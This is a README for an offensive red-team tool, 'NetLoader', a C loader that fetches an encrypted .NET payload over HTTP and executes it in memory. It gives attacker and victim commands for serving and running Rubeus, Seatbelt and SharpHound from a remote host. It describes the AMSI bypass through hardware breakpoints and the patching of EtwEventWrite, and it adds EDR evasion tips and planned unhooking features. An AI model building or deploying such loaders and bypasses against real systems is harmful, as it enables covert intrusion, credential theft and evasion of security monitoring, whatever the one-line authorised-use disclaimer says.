# NetLoader

In-memory .NET assembly loader written in pure C. Fetches an AES-encrypted payload over HTTP, decrypts it at runtime, and executes it through the CLR without dropping anything to disk.

Built for offensive security — loads tools like Rubeus, Seatbelt, SharpHound, etc. directly in memory.

## Features

- **Pure C, no C++ dependencies** — compatible with OLLVM for obfuscation passes
- **In-memory execution** — assembly never touches disk
- **AES-256-CBC encryption** — payload encrypted at rest and in transit
- **AMSI bypass** — hardware breakpoint (DR0) on `AmsiScanBuffer` + VEH handler, no memory patching
- **ETW bypass** — patches `EtwEventWrite` to suppress CLR telemetry
- **Argument passthrough** — forward command-line arguments to the .NET assembly's `Main(string[])`

## Build

```
build.bat
```

## Usage

**Attacker — encrypt and serve:**

```
python encrypt.py Rubeus.exe MyKey -o payload
cd payload && python3 -m http.server 8080
```

**Victim — execute:**

```
clr_loader.exe 10.0.0.5 8080 /Rubeus.enc MyKey -- klist
```

Everything after `--` is passed as arguments to the .NET assembly.

### More examples

```
clr_loader.exe 10.0.0.5 8080 /Seatbelt.enc Secret -- -group=all
clr_loader.exe 10.0.0.5 8080 /SharpHound.enc Pass -- -c All
clr_loader.exe 10.0.0.5 8080 /DavRelayUp.enc Key
```

## How It Works

1. **Fetch** — raw socket HTTP GET to retrieve the encrypted payload
2. **Decrypt** — AES-256-CBC, key = SHA-256(passphrase), using CryptoAPI
3. **AMSI bypass** — hardware breakpoint on `AmsiScanBuffer`, VEH handler forces `AMSI_RESULT_CLEAN` and returns to caller without executing the function
4. **ETW bypass** — overwrites `EtwEventWrite` prologue with `xor rax, rax; ret`
5. **CLR execution** — COM vtable calls: `ICLRMetaHost` → `ICLRRuntimeInfo` → `ICorRuntimeHost` → default AppDomain → `Load_3` → `get_EntryPoint` → `Invoke_3`

## File Structure

```
main.c       — entry point, argument parsing, orchestration
clr.h        — CLR hosting via COM vtables
bypass.h     — AMSI hardware breakpoint + ETW patch
network.h    — HTTP fetch via raw sockets
crypto.h     — AES-256-CBC decryption (CryptoAPI)
encrypt.py   — payload encryptor (requires pycryptodome)
build.bat    — MSVC build script
```

## Requirements

- Visual Studio 2022 (MSVC) for compilation
- Python 3 + pycryptodome (`pip install pycryptodome`) for encryption
- Target: .NET Framework v4.0.30319

## Notes

- The AMSI bypass uses debug registers — no memory patching means it's invisible to kernel ETWTi callbacks
- The loader binary has a clean static signature since it contains no embedded payload
- For EDR evasion, combine with OLLVM obfuscation passes (fla, sub, bcf, split)

## TODO

- [ ] Compile with OLLVM 16.0.6 (control flow flattening, bogus control flow, substitution, split)
- [ ] Indirect syscalls to bypass ntdll hooks (EDR unhooking)
- [ ] Unhook ntdll from disk to avoid inline hooks
- [ ] Sleep obfuscation between stages
- [ ] Stageless mode (embedded encrypted payload, no network fetch)

## Disclaimer

For authorized security testing and research only.
